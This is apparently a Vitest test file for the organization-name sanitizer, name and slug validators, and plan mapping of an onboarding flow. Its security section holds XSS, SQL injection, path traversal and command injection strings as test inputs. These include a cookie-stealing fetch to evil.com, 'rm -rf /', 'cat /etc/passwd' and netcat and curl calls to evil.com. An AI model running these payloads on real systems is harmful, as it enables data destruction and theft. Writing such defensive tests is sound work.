/**
 * @vitest-environment node
 *
 * Organization Onboarding Validation Tests
 *
 * Tests validation functions from:
 * - actions/organization.ts
 * - actions/backend-onboarding.ts
 *
 * Coverage:
 * 1. sanitizeOrgName - HTML removal, special char filtering, length limits
 * 2. isValidOrgName - Length validation, XSS prevention
 * 3. isValidOrgSlug - Format validation (alphanumeric + underscore only)
 * 4. mapPlanToBackendPlan - Plan mapping logic
 * 5. Org slug generation - From company name transformation
 *
 * Security Focus:
 * - XSS attempts (script tags, event handlers)
 * - SQL injection patterns
 * - Path traversal attempts
 * - Boundary testing (min/max lengths)
 * - Special character handling
 * - Empty/null inputs
 */

import { describe, it, expect } from 'vitest'
import { sanitizeOrgName, isValidOrgName } from '@/lib/utils/validation'

// ============================================
// Test Helpers - Extracted Functions
// ============================================

/**
 * Validate org slug format
 * Backend requires: alphanumeric with underscores only (no hyphens), 3-50 characters
 * Source: actions/backend-onboarding.ts
 */
function isValidOrgSlug(orgSlug: string): boolean {
  if (!orgSlug || typeof orgSlug !== "string") return false
  return /^[a-zA-Z0-9_]{3,50}$/.test(orgSlug)
}

/**
 * Map Stripe plan ID to backend subscription plan
 * Source: actions/organization.ts
 */
function mapPlanToBackendPlan(planId: string): "STARTER" | "PROFESSIONAL" | "SCALE" {
  const normalized = planId.toLowerCase()
  if (normalized.includes("scale") || normalized.includes("enterprise")) {
    return "SCALE"
  }
  if (normalized.includes("professional") || normalized.includes("pro") || normalized.includes("team")) {
    return "PROFESSIONAL"
  }
  return "STARTER"
}

/**
 * Generate org slug from company name
 * Source: actions/stripe.ts (extracted logic)
 * Format: companyname_{timestamp} where timestamp is base36
 */
function generateOrgSlug(sanitizedName: string): string {
  const timestamp = Date.now().toString(36)

  // Extract first word only for shorter slug
  const firstWord = sanitizedName
    .split(/\s+/)[0]  // Get first word
    .toLowerCase()
    .replace(/[^a-z0-9]/g, "")
    .slice(0, 20)  // Limit first word to 20 chars max

  return `${firstWord}_${timestamp}`
}

// ============================================
// TESTS: sanitizeOrgName
// ============================================

describe('sanitizeOrgName', () => {
  describe('Valid Inputs', () => {
    it('should preserve valid organization names', () => {
      expect(sanitizeOrgName('Acme Corp')).toBe('Acme Corp')
      expect(sanitizeOrgName('Tech Innovations LLC')).toBe('Tech Innovations LLC')
      expect(sanitizeOrgName('Company123')).toBe('Company123')
      expect(sanitizeOrgName('My-Company')).toBe('My-Company')
    })

    it('should handle names with numbers', () => {
      expect(sanitizeOrgName('Company 2024')).toBe('Company 2024')
      expect(sanitizeOrgName('Tech123 Corp')).toBe('Tech123 Corp')
    })

    it('should trim whitespace', () => {
      expect(sanitizeOrgName('  Acme Corp  ')).toBe('Acme Corp')
      expect(sanitizeOrgName('\n\tCompany\t\n')).toBe('Company')
    })
  })

  describe('HTML Tag Removal', () => {
    it('should remove HTML tags', () => {
      expect(sanitizeOrgName('<p>Company</p>')).toBe('Company')
      expect(sanitizeOrgName('<div>Acme</div> Corp')).toBe('Acme Corp')
      expect(sanitizeOrgName('<h1>Title</h1>')).toBe('Title')
    })

    it('should remove self-closing tags', () => {
      expect(sanitizeOrgName('Company <br/> Name')).toBe('Company  Name')
      expect(sanitizeOrgName('Acme<img/> Corp')).toBe('Acme Corp')
    })

    it('should remove nested tags', () => {
      expect(sanitizeOrgName('<div><span>Nested</span></div>')).toBe('Nested')
      expect(sanitizeOrgName('<p><b>Bold</b> Text</p>')).toBe('Bold Text')
    })
  })

  describe('XSS Prevention', () => {
    it('should block script tags', () => {
      expect(sanitizeOrgName('<script>alert(1)</script>')).toBe('alert(1)')
      expect(sanitizeOrgName('Company<script>alert("XSS")</script>')).toBe('Companyalert(XSS)')
    })

    it('should remove event handlers in HTML tags', () => {
      // Note: onerror="alert(1)" gets quotes removed, tags removed
      expect(sanitizeOrgName('<img onerror="alert(1)" />')).toBe('')
      expect(sanitizeOrgName('<div onclick="hack()">Company</div>')).toBe('Company')
    })

    it('should remove dangerous characters', () => {
      expect(sanitizeOrgName('Company<>')).toBe('Company')
      expect(sanitizeOrgName('Test"Company"')).toBe('TestCompany')
      expect(sanitizeOrgName("Test'Company'")).toBe('TestCompany')
      expect(sanitizeOrgName('Test&Company')).toBe('TestCompany')
      expect(sanitizeOrgName('Test;Company')).toBe('TestCompany')
    })

    it('should handle javascript: protocol (colon NOT removed)', () => {
      // Note: sanitizeOrgName doesn't remove colons
      expect(sanitizeOrgName('javascript:alert(1)')).toBe('javascript:alert(1)')
      expect(sanitizeOrgName('Company javascript:void(0)')).toBe('Company javascript:void(0)')
    })

    it('should handle data: URIs (colon NOT removed)', () => {
      // Note: sanitizeOrgName doesn't remove colons
      expect(sanitizeOrgName('data:text/html,<script>alert(1)</script>')).toBe('data:text/html,alert(1)')
    })
  })

  describe('SQL Injection Prevention', () => {
    it('should remove SQL injection characters', () => {
      // Removes: ', ", ;
      // Keeps: =, spaces, -
      expect(sanitizeOrgName("' OR 1=1; --")).toBe('OR 1=1 --')
      expect(sanitizeOrgName("Company'; DROP TABLE users; --")).toBe('Company DROP TABLE users --')
      expect(sanitizeOrgName('1" OR "1"="1')).toBe('1 OR 1=1')
    })

    it('should handle SQL comment patterns', () => {
      expect(sanitizeOrgName('Company -- comment')).toBe('Company -- comment')
      expect(sanitizeOrgName('Test /* comment */ Corp')).toBe('Test /* comment */ Corp')
    })
  })

  describe('Length Limits', () => {
    it('should truncate to 100 characters', () => {
      const longName = 'A'.repeat(150)
      const sanitized = sanitizeOrgName(longName)
      expect(sanitized.length).toBe(100)
      expect(sanitized).toBe('A'.repeat(100))
    })

    it('should handle exactly 100 characters', () => {
      const exactName = 'B'.repeat(100)
      expect(sanitizeOrgName(exactName)).toBe(exactName)
    })

    it('should preserve names under 100 chars', () => {
      const shortName = 'Short Corp'
      expect(sanitizeOrgName(shortName)).toBe(shortName)
    })
  })

  describe('Edge Cases', () => {
    it('should handle empty strings', () => {
      expect(sanitizeOrgName('')).toBe('')
      expect(sanitizeOrgName('   ')).toBe('')
    })

    it('should handle only special characters', () => {
      expect(sanitizeOrgName('<><><>')).toBe('')
      expect(sanitizeOrgName('""""')).toBe('')
      expect(sanitizeOrgName("''''")).toBe('')
    })

    it('should handle mixed valid and invalid chars', () => {
      expect(sanitizeOrgName('Acme<>Corp')).toBe('AcmeCorp')
      expect(sanitizeOrgName('Test"&"Company')).toBe('TestCompany')
    })

    it('should handle unicode characters', () => {
      expect(sanitizeOrgName('Café Corp')).toBe('Café Corp')
      expect(sanitizeOrgName('北京公司')).toBe('北京公司')
      expect(sanitizeOrgName('Società Italiana')).toBe('Società Italiana')
    })
  })
})

// ============================================
// TESTS: isValidOrgName
// ============================================

describe('isValidOrgName', () => {
  describe('Valid Names', () => {
    it('should accept valid organization names', () => {
      expect(isValidOrgName('Acme Corp')).toBe(true)
      expect(isValidOrgName('Tech Innovations')).toBe(true)
      expect(isValidOrgName('AB')).toBe(true) // Min 2 chars
      expect(isValidOrgName('A'.repeat(100))).toBe(true) // Max 100 chars
    })

    it('should accept names with numbers and hyphens', () => {
      expect(isValidOrgName('Company-123')).toBe(true)
      expect(isValidOrgName('Tech 2024')).toBe(true)
    })
  })

  describe('Length Validation', () => {
    it('should reject names too short', () => {
      expect(isValidOrgName('A')).toBe(false)
      expect(isValidOrgName('')).toBe(false)
      expect(isValidOrgName(' ')).toBe(false)
    })

    it('should reject names too long', () => {
      expect(isValidOrgName('A'.repeat(101))).toBe(false)
      expect(isValidOrgName('A'.repeat(200))).toBe(false)
    })

    it('should accept boundary lengths', () => {
      expect(isValidOrgName('AB')).toBe(true) // Min: 2
      expect(isValidOrgName('A'.repeat(100))).toBe(true) // Max: 100
    })
  })

  describe('XSS Detection', () => {
    it('should reject script tags', () => {
      expect(isValidOrgName('<script>alert(1)</script>')).toBe(false)
      expect(isValidOrgName('Company<script>hack()</script>')).toBe(false)
      expect(isValidOrgName('<SCRIPT>alert(1)</SCRIPT>')).toBe(false) // Case insensitive
    })

    it('should reject closing script tags', () => {
      expect(isValidOrgName('Company</script>')).toBe(false)
      expect(isValidOrgName('</SCRIPT>')).toBe(false)
    })

    it('should reject javascript: protocol', () => {
      expect(isValidOrgName('javascript:alert(1)')).toBe(false)
      expect(isValidOrgName('Company javascript:void(0)')).toBe(false)
      expect(isValidOrgName('JAVASCRIPT:alert(1)')).toBe(false) // Case insensitive
    })

    it('should reject event handlers', () => {
      expect(isValidOrgName('Company onclick=alert(1)')).toBe(false)
      expect(isValidOrgName('Test onerror=hack()')).toBe(false)
      expect(isValidOrgName('onload=evil()')).toBe(false)
      expect(isValidOrgName('ONCLICK=alert(1)')).toBe(false) // Case insensitive
    })

    it('should reject various event handler patterns', () => {
      expect(isValidOrgName('onmouseover=alert(1)')).toBe(false)
      expect(isValidOrgName('onfocus=steal()')).toBe(false)
      expect(isValidOrgName('onblur=hack()')).toBe(false)
    })
  })

  describe('Safe HTML-like Content', () => {
    it('should accept names with HTML entities (not tags)', () => {
      expect(isValidOrgName('Company &amp; Partners')).toBe(true)
      expect(isValidOrgName('A&B Corp')).toBe(true)
    })

    it('should accept names with brackets in safe contexts', () => {
      expect(isValidOrgName('Company [Subsidiary]')).toBe(true)
      expect(isValidOrgName('Tech (USA)')).toBe(true)
    })
  })

  describe('Edge Cases', () => {
    it('should handle whitespace trimming', () => {
      expect(isValidOrgName('  AB  ')).toBe(true) // Trimmed to 2 chars
      expect(isValidOrgName('  A  ')).toBe(false) // Trimmed to 1 char
    })

    it('should handle unicode characters', () => {
      expect(isValidOrgName('Café Corp')).toBe(true)
      expect(isValidOrgName('北京公司')).toBe(true)
    })
  })
})

// ============================================
// TESTS: isValidOrgSlug
// ============================================

describe('isValidOrgSlug', () => {
  describe('Valid Slugs', () => {
    it('should accept valid alphanumeric slugs', () => {
      expect(isValidOrgSlug('acme_corp')).toBe(true)
      expect(isValidOrgSlug('tech_innovations_llc')).toBe(true)
      expect(isValidOrgSlug('company123')).toBe(true)
      expect(isValidOrgSlug('ACME_CORP')).toBe(true)
    })

    it('should accept slugs with underscores', () => {
      expect(isValidOrgSlug('my_company_name')).toBe(true)
      expect(isValidOrgSlug('test_org_2024')).toBe(true)
      expect(isValidOrgSlug('a_b_c')).toBe(true)
    })

    it('should accept mixed case', () => {
      expect(isValidOrgSlug('AcmeCorp')).toBe(true)
      expect(isValidOrgSlug('TechCo_USA')).toBe(true)
    })

    it('should accept boundary lengths', () => {
      expect(isValidOrgSlug('abc')).toBe(true) // Min: 3
      expect(isValidOrgSlug('a'.repeat(50))).toBe(true) // Max: 50
    })
  })

  describe('Invalid Slugs', () => {
    it('should reject slugs with hyphens', () => {
      expect(isValidOrgSlug('acme-corp')).toBe(false)
      expect(isValidOrgSlug('my-company')).toBe(false)
    })

    it('should reject slugs with spaces', () => {
      expect(isValidOrgSlug('acme corp')).toBe(false)
      expect(isValidOrgSlug('my company')).toBe(false)
    })

    it('should reject slugs with special characters', () => {
      expect(isValidOrgSlug('acme@corp')).toBe(false)
      expect(isValidOrgSlug('company!')).toBe(false)
      expect(isValidOrgSlug('test#org')).toBe(false)
      expect(isValidOrgSlug('org$name')).toBe(false)
    })
  })

  describe('Length Validation', () => {
    it('should reject slugs too short', () => {
      expect(isValidOrgSlug('ab')).toBe(false)
      expect(isValidOrgSlug('a')).toBe(false)
      expect(isValidOrgSlug('')).toBe(false)
    })

    it('should reject slugs too long', () => {
      expect(isValidOrgSlug('a'.repeat(51))).toBe(false)
      expect(isValidOrgSlug('a'.repeat(100))).toBe(false)
    })
  })

  describe('Path Traversal Prevention', () => {
    it('should reject path traversal attempts', () => {
      expect(isValidOrgSlug('../admin')).toBe(false)
      expect(isValidOrgSlug('../../etc/passwd')).toBe(false)
      expect(isValidOrgSlug('..')).toBe(false)
      expect(isValidOrgSlug('.')).toBe(false)
    })

    it('should reject URL-encoded path traversal', () => {
      expect(isValidOrgSlug('%2e%2e%2fadmin')).toBe(false)
      expect(isValidOrgSlug('%2e%2e')).toBe(false)
    })
  })

  describe('SQL Injection Prevention', () => {
    it('should reject SQL injection patterns', () => {
      expect(isValidOrgSlug("' OR 1=1; --")).toBe(false)
      expect(isValidOrgSlug("admin'; DROP TABLE--")).toBe(false)
      expect(isValidOrgSlug("1' OR '1'='1")).toBe(false)
    })
  })

  describe('XSS Prevention', () => {
    it('should reject XSS attempts', () => {
      expect(isValidOrgSlug('<script>alert(1)</script>')).toBe(false)
      expect(isValidOrgSlug('javascript:alert(1)')).toBe(false)
      expect(isValidOrgSlug('<img onerror=alert(1)>')).toBe(false)
    })
  })

  describe('Type Validation', () => {
    it('should reject non-string inputs', () => {
      expect(isValidOrgSlug(null as any)).toBe(false)
      expect(isValidOrgSlug(undefined as any)).toBe(false)
      expect(isValidOrgSlug(123 as any)).toBe(false)
      expect(isValidOrgSlug({} as any)).toBe(false)
      expect(isValidOrgSlug([] as any)).toBe(false)
    })
  })

  describe('Edge Cases', () => {
    it('should reject empty strings', () => {
      expect(isValidOrgSlug('')).toBe(false)
      expect(isValidOrgSlug('   ')).toBe(false)
    })

    it('should reject unicode characters', () => {
      expect(isValidOrgSlug('café_corp')).toBe(false)
      expect(isValidOrgSlug('北京公司')).toBe(false)
    })
  })
})

// ============================================
// TESTS: mapPlanToBackendPlan
// ============================================

describe('mapPlanToBackendPlan', () => {
  describe('STARTER Plan Mapping', () => {
    it('should map starter variants to STARTER', () => {
      expect(mapPlanToBackendPlan('starter')).toBe('STARTER')
      expect(mapPlanToBackendPlan('STARTER')).toBe('STARTER')
      expect(mapPlanToBackendPlan('Starter')).toBe('STARTER')
      expect(mapPlanToBackendPlan('basic_starter')).toBe('STARTER')
    })

    it('should default unknown plans to STARTER', () => {
      expect(mapPlanToBackendPlan('unknown')).toBe('STARTER')
      expect(mapPlanToBackendPlan('basic')).toBe('STARTER')
      expect(mapPlanToBackendPlan('free')).toBe('STARTER')
      expect(mapPlanToBackendPlan('trial')).toBe('STARTER')
    })
  })

  describe('PROFESSIONAL Plan Mapping', () => {
    it('should map professional variants to PROFESSIONAL', () => {
      expect(mapPlanToBackendPlan('professional')).toBe('PROFESSIONAL')
      expect(mapPlanToBackendPlan('PROFESSIONAL')).toBe('PROFESSIONAL')
      expect(mapPlanToBackendPlan('Professional')).toBe('PROFESSIONAL')
    })

    it('should map pro variants to PROFESSIONAL', () => {
      expect(mapPlanToBackendPlan('pro')).toBe('PROFESSIONAL')
      expect(mapPlanToBackendPlan('PRO')).toBe('PROFESSIONAL')
      expect(mapPlanToBackendPlan('Pro')).toBe('PROFESSIONAL')
      expect(mapPlanToBackendPlan('plus_pro')).toBe('PROFESSIONAL')
    })

    it('should map team variants to PROFESSIONAL', () => {
      expect(mapPlanToBackendPlan('team')).toBe('PROFESSIONAL')
      expect(mapPlanToBackendPlan('TEAM')).toBe('PROFESSIONAL')
      expect(mapPlanToBackendPlan('Team')).toBe('PROFESSIONAL')
      expect(mapPlanToBackendPlan('team_plan')).toBe('PROFESSIONAL')
    })
  })

  describe('SCALE Plan Mapping', () => {
    it('should map scale variants to SCALE', () => {
      expect(mapPlanToBackendPlan('scale')).toBe('SCALE')
      expect(mapPlanToBackendPlan('SCALE')).toBe('SCALE')
      expect(mapPlanToBackendPlan('Scale')).toBe('SCALE')
      expect(mapPlanToBackendPlan('business_scale')).toBe('SCALE')
    })

    it('should map enterprise variants to SCALE', () => {
      expect(mapPlanToBackendPlan('enterprise')).toBe('SCALE')
      expect(mapPlanToBackendPlan('ENTERPRISE')).toBe('SCALE')
      expect(mapPlanToBackendPlan('Enterprise')).toBe('SCALE')
      expect(mapPlanToBackendPlan('enterprise_plus')).toBe('SCALE')
    })
  })

  describe('Case Insensitivity', () => {
    it('should handle mixed case inputs', () => {
      expect(mapPlanToBackendPlan('PrOfEsSiOnAl')).toBe('PROFESSIONAL')
      expect(mapPlanToBackendPlan('eNtErPrIsE')).toBe('SCALE')
      expect(mapPlanToBackendPlan('sTaRtEr')).toBe('STARTER')
    })
  })

  describe('Substring Matching', () => {
    it('should match plans containing keywords', () => {
      expect(mapPlanToBackendPlan('my_professional_plan')).toBe('PROFESSIONAL')
      expect(mapPlanToBackendPlan('super_enterprise_package')).toBe('SCALE')
      expect(mapPlanToBackendPlan('team_collaboration')).toBe('PROFESSIONAL')
    })

    it('should prioritize scale/enterprise over pro', () => {
      expect(mapPlanToBackendPlan('enterprise_professional')).toBe('SCALE')
      expect(mapPlanToBackendPlan('scale_pro')).toBe('SCALE')
    })
  })

  describe('Edge Cases', () => {
    it('should handle empty strings', () => {
      expect(mapPlanToBackendPlan('')).toBe('STARTER')
    })

    it('should handle special characters', () => {
      expect(mapPlanToBackendPlan('pro-plan')).toBe('PROFESSIONAL')
      expect(mapPlanToBackendPlan('team_2024')).toBe('PROFESSIONAL')
      expect(mapPlanToBackendPlan('enterprise@scale')).toBe('SCALE')
    })

    it('should handle numeric inputs', () => {
      expect(mapPlanToBackendPlan('123')).toBe('STARTER')
      expect(mapPlanToBackendPlan('pro_2024')).toBe('PROFESSIONAL')
    })
  })
})

// ============================================
// TESTS: generateOrgSlug
// ============================================

describe('generateOrgSlug', () => {
  describe('Basic Slug Generation', () => {
    it('should generate slug from single-word company name', () => {
      const slug = generateOrgSlug('Acme')
      expect(slug).toMatch(/^acme_[a-z0-9]+$/)
    })

    it('should generate slug from multi-word company name', () => {
      const slug = generateOrgSlug('Tech Innovations LLC')
      expect(slug).toMatch(/^tech_[a-z0-9]+$/)
    })

    it('should extract only the first word', () => {
      const slug = generateOrgSlug('First Second Third')
      expect(slug).toMatch(/^first_[a-z0-9]+$/)
    })
  })

  describe('Character Normalization', () => {
    it('should convert to lowercase', () => {
      const slug = generateOrgSlug('ACME')
      expect(slug).toMatch(/^acme_[a-z0-9]+$/)
    })

    it('should remove special characters', () => {
      const slug = generateOrgSlug('Acme@Corp!')
      expect(slug).toMatch(/^acmecorp_[a-z0-9]+$/)
    })

    it('should remove hyphens', () => {
      const slug = generateOrgSlug('My-Company')
      expect(slug).toMatch(/^mycompany_[a-z0-9]+$/)
    })

    it('should handle unicode characters', () => {
      const slug = generateOrgSlug('Café')
      // Unicode chars removed, leaving 'caf'
      expect(slug).toMatch(/^caf_[a-z0-9]+$/)
    })
  })

  describe('Length Limits', () => {
    it('should limit first word to 20 characters', () => {
      const longName = 'A'.repeat(50)
      const slug = generateOrgSlug(longName)
      const firstPart = slug.split('_')[0]
      expect(firstPart.length).toBeLessThanOrEqual(20)
    })

    it('should handle exactly 20 character first word', () => {
      const name = 'B'.repeat(20)
      const slug = generateOrgSlug(name)
      expect(slug).toMatch(/^b{20}_[a-z0-9]+$/)
    })
  })

  describe('Timestamp Suffix Format', () => {
    it('should append base36 timestamp suffix', () => {
      const slug = generateOrgSlug('Company')
      const parts = slug.split('_')
      expect(parts.length).toBe(2)
      expect(parts[1]).toMatch(/^[a-z0-9]+$/)
    })

    it('should generate consistent format for same timestamp', () => {
      const slug1 = generateOrgSlug('Test')
      const slug2 = generateOrgSlug('Test')
      // Same timestamp = same date suffix
      expect(slug1.split('_')[1]).toBe(slug2.split('_')[1])
    })
  })

  describe('Edge Cases', () => {
    it('should handle empty first word after sanitization', () => {
      const slug = generateOrgSlug('@#$%')
      // All special chars removed
      expect(slug).toMatch(/^_[a-z0-9]+$/)
    })

    it('should handle whitespace-only input', () => {
      const slug = generateOrgSlug('   ')
      expect(slug).toMatch(/^_[a-z0-9]+$/)
    })

    it('should handle numeric company names', () => {
      const slug = generateOrgSlug('123 Company')
      expect(slug).toMatch(/^123_[a-z0-9]+$/)
    })

    it('should handle mixed alphanumeric', () => {
      const slug = generateOrgSlug('Tech2024 Corp')
      expect(slug).toMatch(/^tech2024_[a-z0-9]+$/)
    })
  })

  describe('Collision Resistance', () => {
    it('should generate unique slugs for same name on different dates', () => {
      // Note: This test will pass only if run on different dates
      // For same-day runs, backend adds timestamp suffix if slug exists
      const slug1 = generateOrgSlug('Company')
      const slug2 = generateOrgSlug('Company')

      // Same date = same slug format (backend handles uniqueness)
      expect(slug1).toBe(slug2)
    })
  })
})

// ============================================
// TESTS: Integration Scenarios
// ============================================

describe('Integration: Sanitize + Validate + Generate', () => {
  it('should process valid company name end-to-end', () => {
    const input = 'Acme Corporation'
    const sanitized = sanitizeOrgName(input)

    expect(isValidOrgName(sanitized)).toBe(true)

    const slug = generateOrgSlug(sanitized)
    expect(isValidOrgSlug(slug)).toBe(true)
    expect(slug).toMatch(/^acme_[a-z0-9]+$/)
  })

  it('should handle XSS attempt end-to-end', () => {
    const input = '<script>alert(1)</script>Valid Company'
    const sanitized = sanitizeOrgName(input)

    // Script tags removed, but isValidOrgName checks BEFORE sanitization
    expect(sanitized).toBe('alert(1)Valid Company')
    // isValidOrgName would reject the original but accept the sanitized version
    expect(isValidOrgName(input)).toBe(false)
    expect(isValidOrgName(sanitized)).toBe(true)

    const slug = generateOrgSlug(sanitized)
    expect(isValidOrgSlug(slug)).toBe(true)
    expect(slug).toMatch(/^alert1valid_[a-z0-9]+$/)
  })

  it('should reject too-short name after sanitization', () => {
    const input = '<p>A</p>'
    const sanitized = sanitizeOrgName(input)

    expect(sanitized).toBe('A')
    expect(isValidOrgName(sanitized)).toBe(false)
  })

  it('should handle SQL injection attempt', () => {
    const input = "Company'; DROP TABLE users; --"
    const sanitized = sanitizeOrgName(input)

    expect(sanitized).toBe('Company DROP TABLE users --')
    expect(isValidOrgName(sanitized)).toBe(true)

    const slug = generateOrgSlug(sanitized)
    expect(isValidOrgSlug(slug)).toBe(true)
  })

  it('should handle empty string after sanitization', () => {
    const input = '<><><>'
    const sanitized = sanitizeOrgName(input)

    expect(sanitized).toBe('')
    expect(isValidOrgName(sanitized)).toBe(false)
  })

  it('should handle unicode company names', () => {
    const input = 'Café Corp'
    const sanitized = sanitizeOrgName(input)

    expect(sanitized).toBe('Café Corp')
    expect(isValidOrgName(sanitized)).toBe(true)

    const slug = generateOrgSlug(sanitized)
    // Unicode removed in slug generation
    expect(slug).toMatch(/^caf_[a-z0-9]+$/)
  })
})

// ============================================
// TESTS: Security Attack Vectors
// ============================================

describe('Security: Attack Vectors', () => {
  describe('XSS Attack Patterns', () => {
    const xssPayloads = [
      { input: '<script>alert(1)</script>', expectValid: false },
      { input: '<img src=x onerror=alert(1)>', expectValid: false },
      { input: '<svg onload=alert(1)>', expectValid: false },
      { input: 'javascript:alert(1)', expectValid: false },
      { input: '<iframe src="javascript:alert(1)">', expectValid: false },
      { input: '<body onload=alert(1)>', expectValid: false },
      { input: '<input onfocus=alert(1) autofocus>', expectValid: false },
      { input: '<select onfocus=alert(1) autofocus>', expectValid: false },
      { input: '<textarea onfocus=alert(1) autofocus>', expectValid: false },
      { input: '<marquee onstart=alert(1)>', expectValid: false },
      { input: '<div onclick="alert(1)">Company</div>', expectValid: false },
      { input: 'Company<script>fetch("evil.com?cookie="+document.cookie)</script>', expectValid: false },
    ]

    xssPayloads.forEach(({ input, expectValid }, index) => {
      it(`should detect XSS payload ${index + 1}: ${input.slice(0, 30)}...`, () => {
        // isValidOrgName should reject these BEFORE sanitization
        expect(isValidOrgName(input)).toBe(expectValid)

        // But after sanitization, they should be safe (though may be too short)
        const sanitized = sanitizeOrgName(input)
        expect(sanitized).not.toContain('<script')
        expect(sanitized).not.toContain('</script>')
      })
    })
  })

  describe('SQL Injection Patterns', () => {
    const sqlPayloads = [
      "' OR 1=1; --",
      "admin'--",
      "' OR '1'='1",
      "1' UNION SELECT * FROM users--",
      "'; DROP TABLE organizations; --",
      "' OR 'a'='a",
      "1' AND '1'='1",
    ]

    sqlPayloads.forEach((payload, index) => {
      it(`should sanitize SQL injection ${index + 1}: ${payload}`, () => {
        const sanitized = sanitizeOrgName(payload)
        expect(sanitized).not.toContain("'")
        expect(sanitized).not.toContain('"')
        expect(sanitized).not.toContain(';')
      })
    })
  })

  describe('Path Traversal Patterns', () => {
    const pathPayloads = [
      '../admin',
      '../../etc/passwd',
      '..\\..\\windows\\system32',
      '%2e%2e%2fadmin',
      '....//....//etc/passwd',
    ]

    pathPayloads.forEach((payload, index) => {
      it(`should reject path traversal ${index + 1}: ${payload}`, () => {
        expect(isValidOrgSlug(payload)).toBe(false)
      })
    })
  })

  describe('Command Injection Patterns', () => {
    const cmdPayloads = [
      { input: 'Company; rm -rf /', sanitized: 'Company rm -rf /' },
      { input: 'Test && cat /etc/passwd', sanitized: 'Test  cat /etc/passwd' },
      { input: 'Name | nc evil.com 1234', sanitized: 'Name | nc evil.com 1234' }, // Pipe NOT removed
      { input: 'Org`whoami`', sanitized: 'Org`whoami`' }, // Backtick NOT removed
      { input: 'Corp$(curl evil.com)', sanitized: 'Corp$(curl evil.com)' }, // $ NOT removed
    ]

    cmdPayloads.forEach(({ input, sanitized }, index) => {
      it(`should sanitize command injection ${index + 1}: ${input}`, () => {
        const result = sanitizeOrgName(input)
        expect(result).toBe(sanitized)
        // Only removes: <, >, ", ', &, ;
        expect(result).not.toContain(';')
        expect(result).not.toContain('&')
      })
    })
  })
})

// ============================================
// TESTS: Boundary Conditions
// ============================================

describe('Boundary Conditions', () => {
  describe('Length Boundaries', () => {
    it('should handle minimum valid length (2 chars)', () => {
      expect(isValidOrgName('AB')).toBe(true)
      expect(isValidOrgName('A')).toBe(false)
    })

    it('should handle maximum valid length (100 chars)', () => {
      expect(isValidOrgName('A'.repeat(100))).toBe(true)
      expect(isValidOrgName('A'.repeat(101))).toBe(false)
    })

    it('should handle slug minimum length (3 chars)', () => {
      expect(isValidOrgSlug('abc')).toBe(true)
      expect(isValidOrgSlug('ab')).toBe(false)
    })

    it('should handle slug maximum length (50 chars)', () => {
      expect(isValidOrgSlug('a'.repeat(50))).toBe(true)
      expect(isValidOrgSlug('a'.repeat(51))).toBe(false)
    })
  })

  describe('Whitespace Handling', () => {
    it('should trim leading whitespace', () => {
      expect(sanitizeOrgName('  Company')).toBe('Company')
    })

    it('should trim trailing whitespace', () => {
      expect(sanitizeOrgName('Company  ')).toBe('Company')
    })

    it('should preserve internal whitespace', () => {
      expect(sanitizeOrgName('My  Company')).toBe('My  Company')
    })

    it('should handle tabs and newlines', () => {
      expect(sanitizeOrgName('\t\nCompany\t\n')).toBe('Company')
    })
  })
})
